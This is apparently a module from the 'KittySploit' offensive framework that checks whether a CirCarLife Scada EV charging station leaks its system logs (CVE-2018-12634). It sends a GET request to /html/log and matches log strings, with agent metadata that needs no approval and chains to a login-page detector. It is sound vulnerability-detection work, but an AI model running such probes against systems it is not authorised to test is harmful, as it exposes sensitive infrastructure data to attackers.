#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CirCarLife Scada before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CirCarLife Scada <4.3 - System Log Exposure Detection',
        'description': 'CirCarLife Scada before 4.3 allows remote attackers to obtain sensitive information via a direct request for the html/log or services/system/info.html URI. CirCarLife is an internet-connected electric vehicle charging station.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'scada', 'circontrol', 'circarlife', 'logs', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://circontrol.com/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-12634',
            'https://www.seebug.org/vuldb/ssvid-97353',
            'https://www.exploit-db.com/exploits/45384/',
            'https://github.com/SadFud/Exploits/tree/master/Real%20World/Suites/cir-pwn-life',
        ],
        'cve': 'CVE-2018-12634',
    }

    def run(self):
        r = self.http_request(method="GET", path='/html/log', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('user.debug', 'user.info', 'EVSE',)
        header_any = ('CirCarLife Scada',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="CirCarLife Scada <4.3 - System Log Exposure detected",
                path='/html/log',
            )
            return True
        return False

